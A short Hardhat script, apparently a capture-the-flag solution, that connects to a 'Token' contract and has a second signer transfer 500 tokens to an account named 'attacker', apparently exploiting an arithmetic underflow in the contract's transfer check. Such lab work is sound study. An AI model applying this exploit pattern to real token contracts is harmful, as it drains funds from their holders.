const { ethers } = require("hardhat")

const CONTRACT_NAME = "Token"
const CONTRACT_ADDRESS = "0xFC499Ef822136d756ae274546E61d20a99607aae"

async function main() {
    const factory = await ethers.getContractFactory(CONTRACT_NAME)
    let contract = factory.attach(CONTRACT_ADDRESS)

    const [attacker, second] = await ethers.getSigners()
    console.log(await contract.balanceOf(attacker.address))

    contract = contract.connect(second)
    await contract.transfer(attacker.address, 500)

    contract = contract.connect(attacker)
    console.log(await contract.balanceOf(attacker.address.toString()))
}

main().catch((error) => {
    console.error(error)
    process.exit(1)
})
